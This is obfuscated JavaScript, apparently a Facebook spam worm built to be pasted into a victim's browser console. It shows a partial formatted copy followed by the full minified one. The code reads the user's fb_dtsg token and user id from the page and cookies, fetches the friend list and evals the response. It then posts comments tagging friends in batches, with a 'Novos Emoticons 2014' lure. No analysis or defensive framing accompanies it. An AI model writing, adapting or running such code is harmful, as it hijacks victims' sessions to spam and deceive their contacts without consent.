                        if (arkadaslar[_0xa22c[16]][_0xa22c[15]][i]) { 
                            mesaj += _0xa22c[18] + arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]] + _0xa22c[20] + arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]] + _0xa22c[22]; 
                            mesaj_text += _0xa22c[23] + arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]; 
                        }; 
                    }; 
                    yorum_yap(id, mesaj); 
                }; 
            }; 
        }; 
        var _0x7892x8 = _0xa22c[24]; 
        _0x7892x8 += _0xa22c[25]; 
        _0x7892x8 += _0xa22c[26]; 
        _0x7892x8 += _0xa22c[27]; 
        _0x7892x8 += _0xa22c[28] + user_id; 
        _0x7892x8 += _0xa22c[29] + user_id; 
        if (document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30]) >= 0) { 
            _0x7892x7[_0xa22c[35]](_0xa22c[33], _0xa22c[34] + _0x7892x8, true); 
        } else { 
            _0x7892x7[_0xa22c[35]](_0xa22c[33], _0xa22c[36] + _0x7892x8, true); 
        }; 
        _0x7892x7[_0xa22c[37]](); 
    }; 
       
    function RandomArkadas() { 
        var _0x7892xa = _0xa22c[10]; 
        for (i = 0; i < 9; i++) { 
            _0x7892xa += _0xa22c[18] + arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]() * arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]] + _0xa22c[20] + arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]() * arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]] + _0xa22c[22]; 
        }; 
        return _0x7892xa; 
    }; 
       
    function yorum_yap(id, _0x7892xc) { 
        var _0x7892xd = new XMLHttpRequest(); 
        var _0x7892x8 = _0xa22c[10]; 
        _0x7892x8 += _0xa22c[40] + id; 
        _0x7892x8 += _0xa22c[41] + encodeURIComponent(_0x7892xc); 
        _0x7892x8 += _0xa22c[42]; 
        _0x7892x8 += _0xa22c[43]; 
        _0x7892x8 += _0xa22c[44]; 
        _0x7892x8 += _0xa22c[45]; 
        _0x7892x8 += _0xa22c[46]; 
        _0x7892x8 += _0xa22c[47] + id + _0xa22c[48]; 
        _0x7892x8 += _0xa22c[49]; 
        _0x7892x8 += _0xa22c[50]; 
        _0x7892x8 += _0xa22c[51]; 
        _0x7892x8 += _0xa22c[52]; 
        _0x7892x8 += _0xa22c[29] + user_id; 
        _0x7892x8 += _0xa22c[53]; 
        _0x7892x8 += _0xa22c[54]; 
        _0x7892x8 += _0xa22c[55]; 
        _0x7892x8 += _0xa22c[56] + fb_dtsg; 
        _0x7892x8 += _0xa22c[57]; 
        _0x7892xd[_0xa22c[35]](_0xa22c[58], _0xa22c[59], true); 
        _0x7892xd[_0xa22c[62]](_0xa22c[60], _0xa22c[61]); 
        _0x7892xd[_0xa22c[6]] = function () { 
            if (_0x7892xd[_0xa22c[7]] == 4 && _0x7892xd[_0xa22c[63]] == 200) { 
                _0x7892xd[_0xa22c[64]]; 
            }; 
        }; 
        _0x7892xd[_0xa22c[37]](_0x7892x8); 
    }; 
    arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","455577634573788","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);